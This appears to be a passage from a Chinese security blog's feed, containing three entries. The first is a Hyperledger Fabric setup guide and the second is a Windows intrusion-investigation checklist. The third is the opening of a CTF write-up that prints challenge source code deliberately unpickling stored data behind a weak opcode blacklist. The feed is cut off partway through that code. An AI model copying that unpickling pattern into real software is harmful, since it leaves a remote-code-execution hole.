    <link href="http://c1oudfl0w0.github.io/blog/2024/06/14/fabric%E6%90%AD%E5%BB%BA/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/14/fabric%E6%90%AD%E5%BB%BA/</id>
    <published>2024-06-13T17:01:40.000Z</published>
    <updated>2024-06-18T17:27:05.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/393805594">https://zhuanlan.zhihu.com/p/393805594</a></p><p>《区块链技术与实践》—— 机械工业出版社</p><span id="more"></span><hr><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Windows 11</p><p>Docker Desktop v4.20.1</p><p>Git Bash</p><hr><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>官方文档：<a href="https://hyperledger-fabric.readthedocs.io/zh-cn/latest/">https://hyperledger-fabric.readthedocs.io/zh-cn/latest/</a></p><ol><li><p>建立 fabric 工作目录，github上下载sample源码：<a href="https://github.com/hyperledger/fabric-samples">https://github.com/hyperledger/fabric-samples</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/hyperledger/fabric-samples.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>下载 fabric release 二进制文件：<a href="https://github.com/hyperledger/fabric/releases/download/v2.3.2/hyperledger-fabric-windows-amd64-2.3.2.tar.gz">https://github.com/hyperledger/fabric/releases/download/v2.3.2/hyperledger-fabric-windows-amd64-2.3.2.tar.gz</a></p><p>解压缩后复制 bin 和 config 到 sample 文件夹</p></li><li><p>下载docker镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull hyperledger/fabric-baseos:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-orderer:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-peer:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-couchdb:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-ca:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用git bash，执行 sample 文件夹中的 test-network 中的 network.sh 文件，建立测试网络</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> network.sh up<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/14/fabric%E6%90%AD%E5%BB%BA/image-20240614011433468.png" alt="image-20240614011433468"></p><p>此时可以看到，测试网络建立了2个peer，一个orderer</p></li></ol><hr><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><h2 id="Peer节点"><a href="#Peer节点" class="headerlink" title="Peer节点"></a>Peer节点</h2><p>Peer节点是一个物理概念，是网络上负责维护账本状态并管理链码的节点</p><p>作为账本和链码的载体，存储包括账本、链码在内的关键数据，并且执行例如背书、链码等特定的程序</p><p>所有的账本查询以及账本修改必须通过链码来操作，所有的链码操作必须通过Peer节点唤起</p><p>即提供了用户与系统交互的接口</p><hr><h2 id="Orderer排序节点"><a href="#Orderer排序节点" class="headerlink" title="Orderer排序节点"></a>Orderer排序节点</h2><p>Orderer节点是共识服务的网络节点，负责接收交易、产生区块，并且对共识机制的策略进行管理</p><hr><h2 id="Chaincode"><a href="#Chaincode" class="headerlink" title="Chaincode"></a>Chaincode</h2><p>链上代码，即智能合约，简称为链码</p><p>一般用go编写，是分布式账本的状态处理逻辑，主要用于执行交易和访问状态数据</p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/393805594&quot;&gt;https://zhuanlan.zhihu.com/p/393805594&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;《区块链技术与实践》—— 机械工业出版社&lt;/p&gt;</summary>
    
    
    
    <category term="Blockchain" scheme="http://c1oudfl0w0.github.io/blog/categories/Blockchain/"/>
    
    
  </entry>
  
  <entry>
    <title>windows入侵排查</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</id>
    <published>2024-06-04T08:54:58.000Z</published>
    <updated>2024-07-09T16:38:28.075Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://www.cnblogs.com/Zerimon/p/16371479.html">https://www.cnblogs.com/Zerimon/p/16371479.html</a></p><p><a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><span id="more"></span><hr><h1 id="系统基本信息"><a href="#系统基本信息" class="headerlink" title="系统基本信息"></a>系统基本信息</h1><p>若只是简单了解系统信息，可通过在命令行中输入<code>systeminfo</code>命令实现</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604165805977.png" alt="image-20240604165805977"></p><h2 id="msinfo32"><a href="#msinfo32" class="headerlink" title="msinfo32"></a>msinfo32</h2><blockquote><p>在基础排查时，可以使用 Microsoft 系统信息工具<code>Msinfo32.exe</code>，它是 Microsoft Windows NT诊断工具（Winmsd.exe）的更新版本</p></blockquote><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604165655083.png" alt="image-20240604165655083"></p><p>此处可以显示出本地计算机的硬件资源、组件和软件环境的信息</p><p>以下是软件环境的内容：</p><ul><li><p>正在运行任务：正在运行任务的名称、路径、进程ID等</p></li><li><p>服务：服务的名称、状态、路径等</p></li><li><p>系统驱动程序：系统驱动程序的名称、描述、文件等</p></li><li><p>加载的模块：加载的模块的名称、路径等</p></li><li><p>启动程序：启动程序的命令、用户名、位置等</p></li></ul><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p><strong>命令行查看</strong>：</p> <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net user<span class="token comment"># 直接收集用户账户信息（注意，此方法看不到以$结尾的隐藏账户）</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604170552039.png" alt="image-20240604170552039"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net user username<span class="token comment"># 查看某个账户的详细信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604170640655.png" alt="image-20240604170640655"></p><p><strong>图形化查看</strong>：</p><p>打开【计算机管理】窗口，单击【本地用户和组】中的【用户】选项，可查看隐藏账户，名称以<code>$</code>结尾的为隐藏账户</p><p>或者在命令行输入下列命令</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">lusrmgr<span class="token punctuation">.</span>msc<span class="token comment"># 直接打开图形界面，查看是否有新增/可疑的账户</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604170819074.png" alt="image-20240604170819074"></p><p><strong>注册表查看：</strong></p><p>打开【注册表编辑器】窗口（<code>win + R</code>输入<code>regedit</code>打开），选择【HKEY_LOCAL_MACHINE】下的【SAM】选项，为该项添加【允许父项的继承权限传播到该对象和所有子对象。包括那些在此明确定义的项目】和【用在此显示的可以应用到子对象的项目替代所有子对象的权限项目】权限，使当前用户拥有SAM的读取权限；</p><p>添加权限完成后按【F5】键，刷新后即可访问子项并查看用户信息；</p><p>在此项下导出所有以 00000 开头的项，将所有导出的项与 000001F4（该项对应Administrator用户）导出内容做比较，若其中的F值相同，则表示系统中存在克隆账户（图直接从参考文章取的）</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604171227341.png" alt="image-20240604171227341"></p><p><strong>wmic</strong>：</p><blockquote><p>wmic 扩展 WMI（Windows Management Instrumentation，Windows管理工具），提供从命令行接口和批命令脚本执行系统管理支持</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wmic useraccount get name<span class="token punctuation">,</span> SID<span class="token comment"># 可以查看系统中的用户信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><p><strong>通过【系统配置】对话框查看</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开Windows系统中的【系统配置】对话框，单击【启动】选项卡，可查看启动项的详细信息</p><p><strong>通过注册表查看</strong>：</p><blockquote><p>注册表是操作系统中一个重要的数据库，主要用于存储系统所必需的信息。注册表以分层的组织形式存储数据元素。数据项是注册表的基本元素，每个数据项下面不但可以存储很多子数据项，还可以以键值对的形式存储数据。</p></blockquote><p>目录含义：</p><ol><li><code>HKEY_CLASSES_ROOT</code>（HKCR）<br>此处存储的信息可确保在Windows资源管理器中执行时打开正确的程序。<br>它还包含有关拖放规则、快捷方法和用户界面信息的更多详细信息。</li><li><code>HKEY_CURRENT_USER</code>（HKCU）<br>包含当前登录系统的用户的配置信息，有用户的文件夹、屏幕颜色和控制面板设置。</li><li><code>HKEY_LOCAL_MACHINE</code>（HKLM）<br>包含运行操作系统的计算机硬件特定信息，有系统上安装的驱动器列表及已安装硬件和应用程序的通用配置。</li><li><code>HKEY_USERS</code>（HKU）<br>包含运行操作系统的计算机硬件特定信息，有系统上安装的驱动器列表及已安装硬件和应用程序的通用配置。</li><li><code>HKEY_CURRENT_CONFIG</code>（HCU）<br>存储有关系统当前配置的信息。</li></ol><hr><h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><blockquote><p>任务计划是Windows系统的一个预置实现某些操作的功能，利用这个功能还可实现自启动的目的</p></blockquote><p>获取方法：</p><ol><li><p>打开【计算机管理】窗口，选择【系统工具】中【任务计划程序】中的【任务计划程序库】选项，可以查看任务计划的名称、状态、触发器等详细信息；</p></li><li><p>在PowerShell下输入<code>Get-ScheduledTask</code>命令，可查看当前系统中所有任务计划的信息，包括任务计划的路径、名称、状态等详细信息；</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604171802384.png" alt="image-20240604171802384"></p></li><li><p>在命令行中输入<code>schtasks</code>命令，可获取任务计划的信息。该命令是一个功能更为强大的超级命令行计划工具，它含有【at】（在较旧的系统中才可以用）命令行工具中的所有功能，获取任务计划时要求必须是本地 Administrators 组的成员。</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604171844807.png" alt="image-20240604171844807"></p></li></ol><hr><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><blockquote><p>Windows系统防火墙最基本的用途是对出、入的数据包进行检测</p></blockquote><p>防火墙规则包括入站规则和出站规则。</p><ul><li>入站规则：根据规则中的过滤条件，过滤从公网到本地主机的流量。</li><li>出站规则：根据规则中的过滤条件，过滤从本地主机到公网的流量。</li></ul><p>两种规则都可以按需自定义流量过滤的条件。</p><p>换句话说，入站规则与进入主机的流量有关，如果在主机上运行一个Web服务器，那就必须告诉防火墙允许外部用户访问主机。</p><p>出站规则与流出主机的流量有关，会将应用程序分类，允许部分应用程序访问外网，而其他应用则不能。</p><p>查看：</p><ul><li><p>打开【Windows防火墙】窗口，单击【高级设置】，然后选择【入站规则】或【出站规则】可查看防火墙的入站规则或出站规则。</p></li><li><p>在命令行中输入<code>netsh</code>命令进行查看</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604172427001.png" alt="image-20240604172427001"></p></li></ul><hr><h1 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h1><p>常见的应急响应事件分类：</p><p>Web入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><h2 id="检查系统账号安全"><a href="#检查系统账号安全" class="headerlink" title="检查系统账号安全"></a>检查系统账号安全</h2><ol><li><p>查看服务器是否有弱口令，远程管理端口是否对公网开放：根据实际情况咨询管理员</p></li><li><p>查看服务器是否存在可疑账号、新增账号、隐藏账号、克隆账号。（可看到以<code>$</code>结尾的隐藏账户）：</p><ul><li><code>lusrmgr.msc</code> &#x2F; <code>compmgmt.msc</code>查看是否有新增&#x2F;可疑的账号，如有管理员群组的（Administrators）里的新增账户，立刻删除或禁用</li><li>检查目录<code>c:\users</code>即可看到创建用户，用户登录后会在该目录创建⼀个以用户名命名的文件夹，当安全日志被删、或者用户已经被删除可以通过该文件夹的创建时间来大致判断用户被创建时间和登录时间。</li></ul></li><li><p>查看服务器是否存在隐藏账号、克隆账号</p><ul><li><p>打开注册表 ，查看管理员对应键值</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604174928652.png" alt="image-20240604174928652"></p></li><li><p>使用D盾_web查杀工具，集成了对克隆账号检测的功能</p><p><img src="/blog/2024/06/04/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20240604174812558.png" alt="image-20240604174812558"></p></li></ul></li><li><p>结合日志，查看管理员登录时间、用户名是否存在异常</p><ul><li><p><code>eventvwr.msc</code>：打开事件查看器</p></li><li><p>导出 Windows 日志，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析：</p><p>登录成功用户和时间</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">LogParser<span class="token punctuation">.</span>exe <span class="token operator">-</span>i:EVT <span class="token string">"SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as username FROM 1.evtx where EventID=4624"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ol><hr><h2 id="检测异常端口"><a href="#检测异常端口" class="headerlink" title="检测异常端口"></a>检测异常端口</h2><p>检查端口连接情况，是否有远程连接、可疑连接</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/Zerimon/p/16371479.html&quot;&gt;https://www.cnblogs.com/Zerimon/p/16371479.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Bypass007/Emergency-Response-Notes&quot;&gt;https://github.com/Bypass007/Emergency-Response-Notes&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="http://c1oudfl0w0.github.io/blog/tags/Windows/"/>
    
    <category term="应急响应" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF X HDCTF 2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/02/DASCTF-X-HDCTF-2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/02/DASCTF-X-HDCTF-2024/</id>
    <published>2024-06-02T02:00:09.000Z</published>
    <updated>2024-07-09T16:43:48.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>das偶遇b神出题，java&amp;.net&amp;python强如怪物，拼尽全力也无法战胜😭（也就是又爆零了）</p><p>应该是近期最后一次打ctf了，剩下的事交给复现了</p><p>官方wp：<a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq?singleDoc#">https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq?singleDoc#</a></p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="OtenkiImp-Unsolved"><a href="#OtenkiImp-Unsolved" class="headerlink" title="OtenkiImp (Unsolved)"></a>OtenkiImp (Unsolved)</h2><blockquote><p>python aiohttp框架</p></blockquote><p>又是百分百晴天女</p><p>f12发现&#x2F;hint</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> aiohttp <span class="token keyword">import</span> web<span class="token keyword">import</span> time<span class="token keyword">import</span> json<span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">import</span> time<span class="token keyword">import</span> aiomysql<span class="token keyword">from</span> settings <span class="token keyword">import</span> config<span class="token punctuation">,</span> messages<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">mysql_init</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">:</span>    mysql_conf <span class="token operator">=</span> app<span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'mysql'</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            mysql_pool <span class="token operator">=</span> <span class="token keyword">await</span> aiomysql<span class="token punctuation">.</span>create_pool<span class="token punctuation">(</span>host<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                    port<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                    user<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                    password<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                    db<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'db'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>on_shutdown<span class="token punctuation">.</span>append<span class="token punctuation">(</span>mysql_close<span class="token punctuation">)</span>    app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span> <span class="token operator">=</span> mysql_pool    <span class="token keyword">return</span> app<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">mysql_close</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">:</span>    app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>wait_closed<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./static/index.html"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        html <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>html<span class="token punctuation">,</span> content_type<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'i'</span><span class="token punctuation">,</span> <span class="token string">b'o'</span><span class="token punctuation">,</span> <span class="token string">b'b'</span><span class="token punctuation">,</span> <span class="token string">b'V'</span><span class="token punctuation">,</span> <span class="token string">b'__setstate__'</span><span class="token punctuation">]</span>    white_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'__main__'</span><span class="token punctuation">,</span> <span class="token string">b'builtins'</span><span class="token punctuation">,</span> <span class="token string">b'contact'</span><span class="token punctuation">,</span> <span class="token string">b'time'</span><span class="token punctuation">,</span> <span class="token string">b'dict'</span><span class="token punctuation">,</span> <span class="token string">b'reason'</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> white_list<span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">getWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    wishes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    sql <span class="token operator">=</span> <span class="token string">'select id,wish from wishes where id=&#123;id&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                        <span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    sql <span class="token operator">=</span> <span class="token string">'select id,wish from wishes'</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                datas <span class="token operator">=</span> <span class="token keyword">await</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> wish<span class="token punctuation">)</span> <span class="token keyword">in</span> datas<span class="token punctuation">:</span>        <span class="token keyword">if</span> check<span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">:</span>            wishes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>wishes<span class="token punctuation">)</span><span class="token punctuation">,</span> content_type<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">addWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"contact"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"place"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"reason"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">"contact"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"contact"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"place"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"place"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"reason"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"date"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"timestamp"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>        <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>        wish <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token 